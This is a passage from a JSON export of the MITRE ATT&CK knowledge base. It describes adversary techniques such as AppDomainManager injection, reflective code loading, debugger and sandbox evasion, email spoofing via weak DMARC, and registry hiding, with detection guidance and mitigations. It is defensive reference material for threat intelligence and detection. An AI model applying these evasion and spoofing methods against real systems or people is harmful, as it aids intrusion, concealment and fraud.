reading files, or other suspicious behaviors that could relate to post-compromise behavior.\n\nMonitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances. for known bad sequence of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>WriteProcessMemory()</code> and <code>NtQueryInformationProcess()</code> with the parameter set to <code>ProcessBasicInformation</code> may be used for this technique. <a href=\"https://blog.malwarebytes.com/threat-intelligence/2022/01/north-koreas-lazarus-apt-leverages-windows-update-client-github-in-latest-campaign/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Lazarus APT January 2022)</a>","platforms":["Windows"],"dataSources":["Process: OS API Execution"],"mitigations":[{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"Some endpoint security solutions can be configured to block some types of behaviors related to process injection/memory tampering based on common sequences of indicators (ex: execution of specific API functions)."}]},{"id":"T1574.014","name":"AppDomainManager","description":"Adversaries may execute their own malicious payloads by hijacking how the .NET <code>AppDomainManager</code> loads assemblies. The .NET framework uses the <code>AppDomainManager</code> class to create and manage one or more isolated runtime environments (called application domains) inside a process to host the execution of .NET applications. Assemblies (<code>.exe</code> or <code>.dll</code> binaries compiled to run as .NET code) may be loaded into an application domain as executable code. <a href=\"https://learn.microsoft.com/dotnet/framework/app-domains/application-domains\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft App Domains)</a> \n\nKnown as \"AppDomainManager injection,\" adversaries may execute arbitrary code by hijacking how .NET applications load assemblies. For example, malware may create a custom application domain inside a target process to load and execute an arbitrary assembly. Alternatively, configuration files (<code>.config</code>) or process environment variables that define .NET runtime settings may be tampered with to instruct otherwise benign .NET applications to load a malicious assembly (identified by name) into the target process. <a href=\"https://pentestlaboratories.com/2020/05/26/appdomainmanager-injection-and-detection/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: PenTestLabs AppDomainManagerInject)</a> <a href=\"https://www.pwc.com/gx/en/issues/cybersecurity/cyber-threat-intelligence/yellow-liderc-ships-its-scripts-delivers-imaploader-malware.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: PwC Yellow Liderc)</a> <a href=\"https://www.rapid7.com/blog/post/2023/05/05/appdomain-manager-injection-new-techniques-for-red-teams/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Rapid7 AppDomain Manager Injection)</a>","detection":"","platforms":["Windows"],"dataSources":["Module: Module Load","File: File Creation","Process: Process Creation"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Install .NET applications and related software in write-protected locations. Set directory access controls to prevent file writes to the search paths for .NET applications, both in the folders where applications are run from and the standard resources folders."}]}]},{"id":"T1612","name":"Build Image on Host","description":"Adversaries may build a container image directly on a host to bypass defenses that monitor for the retrieval of malicious images from a public registry. A remote <code>build</code> request may be sent to the Docker API that includes a Dockerfile that pulls a vanilla base image, such as alpine, from a public or local registry and then builds a custom image upon it. <a href=\"https://docs.docker.com/engine/api/v1.41/#operation/ImageBuild\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Docker Build Image)</a>\n\nAn adversary may take advantage of that <code>build</code> API to build a custom image on the host that includes malware downloaded from their C2 server, and then they may utilize Deploy Container using that custom image. <a href=\"https://blog.aquasec.com/malicious-container-image-docker-container-host\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Aqua Build Images on Hosts)</a> <a href=\"https://info.aquasec.com/hubfs/Threat%20reports/AquaSecurity_Cloud_Native_Threat_Report_2021.pdf?utm_campaign=WP%20-%20Jun2021%20Nautilus%202021%20Threat%20Research%20Report&utm_medium=email&_hsmi=132931006&_hsenc=p2ANqtz-_8oopT5Uhqab8B7kE0l3iFo1koirxtyfTehxF7N-EdGYrwk30gfiwp5SiNlW3G0TNKZxUcDkYOtwQ9S6nNVNyEO-Dgrw&utm_content=132931006&utm_source=hs_automation\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Aqua Security Cloud Native Threat Report June 2021)</a> If the base image is pulled from a public registry, defenses will likely not detect the image as malicious since it’s a vanilla image. If the base image already resides in a local registry, the pull may be considered even less suspicious since the image is already in the environment.","detection":"Monitor for unexpected Docker image build requests to the Docker daemon on hosts in the environment. Additionally monitor for subsequent network communication with anomalous IPs that have never been seen before in the environment that indicate the download of malicious code.","platforms":["Containers"],"dataSources":["Image: Image Creation","Network Traffic: Network Traffic Content","Network Traffic: Network Connection Creation","Network Traffic: Network Traffic Flow"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Ensure containers are not running as root by default. In Kubernetes environments, consider defining Pod Security Standards that prevent pods from running privileged containers. <a href=\"https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes Hardening Guide)</a>"},{"id":"M1030","name":"Network Segmentation","description":"Deny direct remote access to internal systems through the use of network proxies, gateways, and firewalls."},{"id":"M1035","name":"Limit Access to Resource Over Network","description":"Limit communications with the container service to local Unix sockets or remote access via SSH. Require secure port access to communicate with the APIs over TLS by disabling unauthenticated access to the Docker API on port 2375. Instead, communicate with the Docker API over TLS on port 2376. <a href=\"https://docs.docker.com/engine/security/protect-access/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Docker Daemon Socket Protect)</a>"},{"id":"M1047","name":"Audit","description":"Audit images deployed within the environment to ensure they do not contain any malicious components."}],"subTechniques":[]},{"id":"T1620","name":"Reflective Code Loading","description":"Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk (e.g., Shared Modules).\n\nReflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode). <a href=\"https://thewover.github.io/Introducing-Donut/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Introducing Donut)</a> <a href=\"https://www.sentinelone.com/blog/building-a-custom-tool-for-shellcode-analysis/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: S1 Custom Shellcode Tool)</a> <a href=\"https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Stuart ELF Memory)</a> <a href=\"https://0x00sec.org/t/super-stealthy-droppers/3715\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: 00sec Droppers)</a> <a href=\"https://www.mandiant.com/resources/bring-your-own-land-novel-red-teaming-technique\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant BYOL)</a> For example, the <code>Assembly.Load()</code> method executed by PowerShell may be abused to load raw code into the running process. <a href=\"https://learn.microsoft.com/dotnet/api/system.reflection.assembly.load\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft AssemblyLoad)</a>\n\nReflective code injection is very similar to Process Injection except that the “injection” loads code into the processes’ own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution. <a href=\"https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Stuart ELF Memory)</a> <a href=\"https://0x00sec.org/t/super-stealthy-droppers/3715\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: 00sec Droppers)</a> <a href=\"https://www.intezer.com/blog/research/acbackdoor-analysis-of-a-new-multiplatform-backdoor/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Intezer ACBackdoor)</a> <a href=\"https://www.sentinelone.com/blog/teaching-an-old-rat-new-tricks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: S1 Old Rat New Tricks)</a>","detection":"Monitor for code artifacts associated with reflectively loading code, such as the abuse of .NET functions such as <code>Assembly.Load()</code> and Native API functions such as <code>CreateThread()</code>, <code>memfd_create()</code>, <code>execve()</code>, and/or <code>execveat()</code>. <a href=\"https://0x00sec.org/t/super-stealthy-droppers/3715\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: 00sec Droppers)</a> <a href=\"https://www.sentinelone.com/blog/teaching-an-old-rat-new-tricks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: S1 Old Rat New Tricks)</a>\n\nMonitor for artifacts of abnormal process execution. For example, a common signature related to reflective code loading on Windows is mechanisms related to the .NET Common Language Runtime (CLR) -- such as mscor.dll, mscoree.dll, and clr.dll -- loading into abnormal processes (such as notepad.exe). Similarly, AMSI / ETW traces can be used to identify signs of arbitrary code execution from within the memory of potentially compromised processes. <a href=\"https://www.mdsec.co.uk/2020/06/detecting-and-advancing-in-memory-net-tradecraft/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MDSec Detecting DOTNET)</a> <a href=\"https://thewover.github.io/Introducing-Donut/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Introducing Donut)</a>\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.","platforms":["Linux","macOS","Windows"],"dataSources":["Module: Module Load","Script: Script Execution","Process: OS API Execution"],"mitigations":[],"subTechniques":[]},{"id":"T1622","name":"Debugger Evasion","description":"Adversaries may employ various means to detect and avoid debuggers. Debuggers are typically used by defenders to trace and/or analyze the execution of potential malware payloads. <a href=\"https://github.com/processhacker/processhacker\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ProcessHacker Github)</a>\n\nDebugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment. Similar to Virtualization/Sandbox Evasion, if the adversary detects a debugger, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for debugger artifacts before dropping secondary or additional payloads.\n\nSpecific checks will vary based on the target and/or adversary. On Windows, this may involve Native API function calls such as <code>IsDebuggerPresent()</code> and <code> NtQueryInformationProcess()</code>, or manually checking the <code>BeingDebugged</code> flag of the Process Environment Block (PEB). On Linux, this may involve querying <code>/proc/self/status</code> for the <code>TracerPID</code> field, which indicates whether or not the process is being traced by dynamic analysis tools. <a href=\"https://www.cadosecurity.com/blog/p2pinfect-new-variant-targets-mips-devices\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cado Security P2PInfect 2023)</a> <a href=\"https://global.ptsecurity.com/analytics/pt-esc-threat-intelligence/hellhounds-operation-lahat\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Positive Technologies Hellhounds 2023)</a> Other checks for debugging artifacts may also seek to enumerate hardware breakpoints, interrupt assembly opcodes, time checks, or measurements if exceptions are raised in the current process (assuming a present debugger would “swallow” or handle the potential error). <a href=\"https://github.com/hasherezade/malware_training_vol1/blob/main/slides/module3/Module3_2_fingerprinting.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: hasherezade debug)</a> <a href=\"https://github.com/LordNoteworthy/al-khaser/tree/master/al-khaser/AntiDebug\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AlKhaser Debug)</a> <a href=\"https://github.com/vxunderground/VX-API/tree/main/Anti%20Debug\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: vxunderground debug)</a>\n\nMalware may also leverage Structured Exception Handling (SEH) to detect debuggers by throwing an exception and detecting whether the process is suspended. SEH handles both hardware and software expectations, providing control over the exceptions including support for debugging. If a debugger is present, the program’s control will be transferred to the debugger, and the execution of the code will be suspended. If the debugger is not present, control will be transferred to the SEH handler, which will automatically handle the exception and allow the program’s execution to continue. <a href=\"https://www.apriorit.com/dev-blog/367-anti-reverse-engineering-protection-techniques-to-use-before-releasing-software\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Apriorit)</a>\n\nAdversaries may use the information learned from these debugger checks during automated discovery to shape follow-on behaviors. Debuggers can also be evaded by detaching the process or flooding debug logs with meaningless data via messages produced by looping Native API function calls such as <code>OutputDebugStringW()</code>. <a href=\"https://objective-see.com/blog/blog_0x60.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: wardle evilquest partii)</a> <a href=\"https://research.checkpoint.com/2021/stopping-serial-killer-catching-the-next-strike/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Checkpoint Dridex Jan 2021)</a>","detection":"Debugger related system checks will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to debugger identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious Native API function calls as well as processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.\n\nMonitor debugger logs for signs of abnormal and potentially malicious activity.","platforms":["Linux","macOS","Windows"],"dataSources":["Process: Process Creation","Process: OS API Execution","Application Log: Application Log Content","Command: Command Execution"],"mitigations":[],"subTechniques":[]},{"id":"T1678","name":"Delay Execution","description":"Adversaries may employ various time-based methods to evade detection and analysis. These techniques often exploit system clocks, delays, or timing mechanisms to obscure malicious activity, blend in with benign activity, and avoid scrutiny. Adversaries can perform this behavior within virtualization/sandbox environments or natively on host systems. \n\nAdversaries may utilize programmatic <code>sleep</code> commands or native system scheduling functionality, for example Scheduled Task/Job. Benign commands or other operations may also be used to delay malware execution or ensure prior commands have had time to execute properly. Loops or otherwise needless repetitions of commands, such as <code>ping</code>, may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments. <a href=\"https://news.sophos.com/en-us/2021/07/04/independence-day-revil-uses-supply-chain-exploit-to-attack-hundreds-of-businesses/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Revil Independence Day)</a> <a href=\"https://www.netskope.com/blog/nitol-botnet-makes-resurgence-evasive-sandbox-analysis-technique\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Netskope Nitol)</a> Another variation, commonly referred to as API hammering, involves making various calls to Native API functions in order to delay execution (while also potentially overloading analysis environments with junk data). <a href=\"https://www.joesecurity.org/blog/3660886847485093803\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Joe Sec Nymaim)</a> <a href=\"https://www.joesecurity.org/blog/498839998833561473\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Joe Sec Trickbot)</a>","detection":"","platforms":["Linux","macOS","Windows"],"dataSources":[],"mitigations":[],"subTechniques":[]},{"id":"T1679","name":"Selective Exclusion","description":"Adversaries may intentionally exclude certain files, folders, directories, file types, or system components from encryption or tampering during a ransomware or malicious payload execution. Some file extensions that adversaries may avoid encrypting include <code>.dll</code>, <code>.exe</code>, and <code>.lnk</code>. <a href=\"https://unit42.paloaltonetworks.com/medusa-ransomware-escalation-new-leak-site/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Palo Alto Unit 42 Medusa Group Medusa Ransomware January 2024)</a>  \n\nAdversaries may perform this behavior to avoid alerting users, to evade detection by security tools and analysts, or, in the case of ransomware, to ensure that the system remains operational enough to deliver the ransom notice. \n\nExclusions may target files and components whose corruption would cause instability, break core services, or immediately expose the attack. By carefully avoiding these areas, adversaries maintain system responsiveness while minimizing indicators that could trigger alarms or otherwise inhibit achieving their goals.","detection":"","platforms":["Windows"],"dataSources":[],"mitigations":[],"subTechniques":[]},{"id":"T1684","name":"Social Engineering","description":"Adversaries may use social engineering techniques to influence users to take actions that result in unauthorized access, approval of changes, disclosure of sensitive information, or execution of adversary-supplied instructions (i.e., introduction of malicious payloads or software), while minimizing technical indicators. \n\nAdversaries may leverage trust-building methods across multiple channels (e.g., executive, vendor, or help desk scenarios, including AI-enabled voice interactions) to prompt user-authorized actions such as password resets, MFA changes, financial approvals, or the disclosure of sensitive information. Adversaries may also leverage common business communications and workflows such as email, collaboration platforms, voice communications, recruiting processes, help desk interactions, and SaaS consent mechanisms to make malicious requests appear routine and legitimate. <a href=\"https://www.proofpoint.com/us/blog/threat-insight/social-engineering-dmarc-abuse-ta427s-art-information-gathering\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Proofpoint TA427 April 2024)</a> <a href=\"https://www.sentinelone.com/cybersecurity-101/threat-intelligence/types-of-social-engineering-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SE SentinelOne 2)</a> <a href=\"https://www.cybersecuritydive.com/news/hackers-target-workday-in-social-engineering-attack/758095/#:~:text=Researchers%20cite%20increasing%20evidence%20of,told%20Cybersecurity%20Dive%20via%20email.\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SE - Hackers Target Workday)</a>\n\nAdditionally, adversaries have persuaded victims to take actions through references of current events, harnessing relevant themes to the work role or the organizations mission. For example, adversaries may use scare tactics (i.e., threaten repercussions for non-compliance) or otherwise incite victims’ emotions in order to generate a sense of urgency to take action. <a href=\"https://www.proofpoint.com/us/threat-reference/social-engineering\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SE Proofpoint)</a> <a href=\"https://www.sentinelone.com/blog/social-engineering-attacks-how-to-recognize-and-resist-the-bait/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SE SentinelOne)</a>\n\nThis technique may include common social engineering patterns such as Phishing and Spearphishing Voice, often supported by convincing and targeted narratives. <a href=\"https://www.sentinelone.com/cybersecurity-101/threat-intelligence/types-of-social-engineering-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SE SentinelOne 2)</a> <a href=\"https://www.fortinet.com/uk/resources/cyberglossary/recent-cyber-attacks\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Fortinet Trends 25-26)</a>","detection":"","platforms":["Linux","macOS","Office Suite","SaaS","Windows"],"dataSources":[],"mitigations":[{"id":"M1017","name":"User Training","description":"Reduces success of phishing/vishing/impersonation and modern “human interface” lures. <a href=\"https://www.sentinelone.com/cybersecurity-101/threat-intelligence/types-of-social-engineering-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SE SentinelOne 2)</a> <a href=\"https://www.sophos.com/en-us/blog/evil-evolution-clickfix-and-macos-infostealers\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sophos User Interaction)</a> <a href=\"https://www.paloaltonetworks.com/resources/research/unit-42-incident-response-report#:~:text=The%20Browser%20Attack%20Surface:%20Attacks%20at%20the%20Human%20Interface&text=The%20site%20used%20social-engineering,deployment%20and%20broader%20operational%20disruption\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit 42 Global Incident Response Report 2026)</a>"},{"id":"M1036","name":"Account Use Policies","description":"Adds verification for helpdesk resets, approvals, and app consents commonly targeted by impersonation. <a href=\"https://www.sentinelone.com/cybersecurity-101/threat-intelligence/types-of-social-engineering-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SE SentinelOne 2)</a> <a href=\"https://www.cybersecuritydive.com/news/hackers-target-workday-in-social-engineering-attack/758095/#:~:text=Researchers%20cite%20increasing%20evidence%20of,told%20Cybersecurity%20Dive%20via%20email.\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SE - Hackers Target Workday)</a>"},{"id":"M1047","name":"Audit","description":"Enables correlation of email/identity/SaaS/endpoint activity that appears legitimate. <a href=\"https://www.proofpoint.com/us/blog/threat-insight/social-engineering-dmarc-abuse-ta427s-art-information-gathering\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Proofpoint TA427 April 2024)</a> <a href=\"https://www.paloaltonetworks.com/resources/research/unit-42-incident-response-report#:~:text=The%20Browser%20Attack%20Surface:%20Attacks%20at%20the%20Human%20Interface&text=The%20site%20used%20social-engineering,deployment%20and%20broader%20operational%20disruption\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit 42 Global Incident Response Report 2026)</a>"}],"subTechniques":[{"id":"T1684.001","name":"Impersonation","description":"Adversaries may impersonate a trusted person or organization in order to persuade and trick a target into performing some action on their behalf. For example, adversaries may communicate with victims (via Phishing for Information, Phishing, or Internal Spearphishing) while impersonating a known sender such as an executive, colleague, or third-party vendor. Established trust can then be leveraged to accomplish an adversary’s ultimate goals, possibly against multiple victims.\n\nIn many cases of business email compromise or email fraud campaigns, adversaries use impersonation to defraud victims -- deceiving them into sending money or divulging information that ultimately enables Financial Theft.\n\nAdversaries will often also use social engineering techniques such as manipulative and persuasive language in email subject lines and body text such as <code>payment</code>, <code>request</code>, or <code>urgent</code> to push the victim to act quickly before malicious activity is detected. These campaigns are often specifically targeted against people who, due to job roles and/or accesses, can carry out the adversary’s goal.  \n\nImpersonation is typically preceded by reconnaissance techniques such as Gather Victim Identity Information and Gather Victim Org Information as well as acquiring infrastructure such as email domains (i.e. Domains) to substantiate their false identity. <a href=\"https://www.crowdstrike.com/en-us/cybersecurity-101/threat-intelligence/business-email-compromise-bec/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Crowdstrike BEC)</a>\n\nThere is the potential for multiple victims in campaigns involving impersonation. For example, an adversary may Compromise Accounts targeting one organization which can then be used to support impersonation against other entities. <a href=\"https://www.cloudflare.com/learning/email-security/what-is-vendor-email-compromise/#:~:text=Vendor%20email%20compromise%2C%20also%20referred,steal%20from%20that%20vendor%27s%20customers.\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: VEC)</a>","detection":"","platforms":["Linux","macOS","Office Suite","SaaS","Windows"],"dataSources":[],"mitigations":[{"id":"M1017","name":"User Training","description":"Train users to be aware of impersonation tricks and how to counter them, for example confirming incoming requests through an independent platform like a phone call or in-person, to reduce risk."},{"id":"M1019","name":"Threat Intelligence Program","description":"Threat intelligence helps defenders and users be aware of and defend against common lures and active campaigns that have been used for impersonation."}]},{"id":"T1684.002","name":"Email Spoofing","description":"Adversaries may fake, or spoof, a sender’s identity by modifying the value of relevant email headers in order to establish contact with victims under false pretenses. <a href=\"https://www.proofpoint.com/us/blog/threat-insight/social-engineering-dmarc-abuse-ta427s-art-information-gathering\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Proofpoint TA427 April 2024)</a> In addition to actual email content, email headers (such as the FROM header, which contains the email address of the sender) may also be modified. Email clients display these headers when emails appear in a victim's inbox, which may cause modified emails to appear as if they were from the spoofed entity.\n\nEnterprise environments can use Domain-based Message Authentication, Reporting, and Conformance (DMARC) as an email authentication protocol that references results of the Sender Policy Framework (SPF) and DomainKeys Identified Mail (DKIM) configurations. SPF and DKIM are configured separately in DNS: SPF verifies that the sending server is authorized for the domain, while DKIM uses a digital signature to verify email integrity and domain authentication. Together, they validate email authenticity and specify how receiving servers should handle authentication failures. Without enforced identity authentication, adversaries may compromise the integrity of an authentication check with altered headers that would not have otherwise passed. <a href=\"https://www.cloudflare.com/learning/email-security/dmarc-dkim-spf/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cloudflare DMARC, DKIM, and SPF)</a> <a href=\"https://dmarc.org/overview\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DMARC-overview)</a> <a href=\"https://www.proofpoint.com/us/threat-reference/dmarc\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Proofpoint-DMARC)</a>\n\nAn example of a weak or absent DMARC policy is <code>v=DMARC1; p=none; fo=1;</code>. The <code>p=none</code>. The <code>p=none</code> indicates no action should be taken, and therefore no filtering action will take place, even if an email fails authentication checks (i.e., SPF and/or DKIM fail). When a DMARC policy indicates no action, the email will still be delivered to the victim’s inbox. <a href=\"https://www.ic3.gov/CSA/2024/240502.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ic3-dprk)</a> \n\nAdversaries have abused weak or absent DMARC policies to circumvent authentication checks and conceal social engineering attempts. Adversaries can alter email headers to include legitimate domain names with fake usernames or impersonate legitimate users via Impersonation for Phishing. Additionally, adversaries may abuse Microsoft 365’s Direct Send functionality to spoof internal users by using internal devices like printers to send emails without authentication. <a href=\"https://www.varonis.com/blog/direct-send-exploit\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Barnea DirectSend)</a>","detection":"","platforms":["Linux","macOS","Office Suite","Windows"],"dataSources":[],"mitigations":[{"id":"M1054","name":"Software Configuration","description":"Use anti-spoofing and email authentication mechanisms to filter messages based on validity checks of the sender domain (using SPF) and integrity of messages (using DKIM). Enabling these mechanisms within an organization (through policies such as DMARC) may enable recipients (intra-org and cross domain) to perform similar message filtering and validation. <a href=\"https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/anti-spoofing-protection?view=o365-worldwide\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Anti Spoofing)</a> <a href=\"https://web.archive.org/web/20210708014107/https://www.cyber.gov.au/sites/default/files/2019-03/spoof_email_sender_policy_framework.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ACSC Email Spoofing)</a>"}]}]}]},{"tactic":"Defense Impairment","techniques":[{"id":"T1112","name":"Modify Registry","description":"Adversaries may interact with the Windows Registry as part of a variety of other techniques to aid in defense evasion, persistence, and execution.\n\nAccess to specific areas of the Registry depends on account permissions, with some keys requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification. <a href=\"https://technet.microsoft.com/en-us/library/cc732643.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Reg)</a> Other tools, such as remote access tools, may also contain functionality to interact with the Registry through the Windows API.\n\nThe Registry may be modified in order to hide configuration information or malicious payloads via Obfuscated Files or Information. <a href=\"https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit42 BabyShark Feb 2019)</a> <a href=\"https://arxiv.org/pdf/2102.04796\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Avaddon Ransomware 2021)</a> <a href=\"https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft BlackCat Jun 2022)</a> <a href=\"https://www.cisa.gov/news-events/alerts/2018/03/15/russian-government-cyber-activity-targeting-energy-and-other-critical-infrastructure-sectors\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CISA Russian Gov Critical Infra 2018)</a> The Registry may also be modified to impair defenses, such as by enabling macros for all Microsoft Office products, allowing privilege escalation without alerting the user, increasing the maximum number of allowed outbound requests, and/or modifying systems to store plaintext credentials in memory. <a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CISA LockBit 2023)</a> <a href=\"https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit42 BabyShark Feb 2019)</a>\n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system. <a href=\"https://technet.microsoft.com/en-us/library/cc754820.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Remote)</a> Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication.\n\nFinally, Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API. <a href=\"https://docs.microsoft.com/sysinternals/downloads/reghide\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Reghide NOV 2006)</a> Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence. <a href=\"https://blog.trendmicro.com/trendlabs-security-intelligence/poweliks-malware-hides-in-windows-registry/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TrendMicro POWELIKS AUG 2014)</a> <a href=\"https://posts.specterops.io/hiding-registry-keys-with-psreflect-b18ec5ac8353\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SpectorOps Hiding Reg Jul 2017)</a>","detection":"Modifications to the Registry are normal and occur throughout typical use of the Windows operating system. Consider enabling Registry Auditing on specific keys to produce an alertable event (Event ID 4657) whenever a value is changed (though this may not trigger when values are created with Reghide or other evasive methods). <a href=\"https://docs.microsoft.com/windows/security/threat-protection/auditing/event-4657\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft 4657 APR 2017)</a> Changes to Registry entries that load software on Windows startup that do not correlate with known software, patch cycles, etc., are suspicious, as are additions or changes to files within the startup folder. Changes could also include new services and modification of existing binary paths to point to malicious files. If a change to a service-related entry occurs, then it will likely be followed by a local or remote service start or restart to execute the file.\n\nMonitor processes and command-line arguments for actions that could be taken to change or delete information in the Registry. Remote access tools with built-in features may interact directly with the Windows API to gather information. The Registry may also be modified through Windows system management tools such as Windows Management Instrumentation and PowerShell, which may require additional logging features to be configured in the operating system to collect necessary information for analysis.\n\nMonitor for processes, command-line arguments, and API calls associated with concealing Registry keys, such as Reghide. <a href=\"https://docs.microsoft.com/sysinternals/downloads/reghide\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Reghide NOV 2006)</a> Inspect and cleanup malicious hidden Registry entries using Native Windows API calls and/or tools such as Autoruns <a href=\"https://posts.specterops.io/hiding-registry-keys-with-psreflect-b18ec5ac8353\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SpectorOps Hiding Reg Jul 2017)</a> and RegDelNull <a href=\"https://docs.microsoft.com/en-us/sysinternals/downloads/regdelnull\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft RegDelNull July 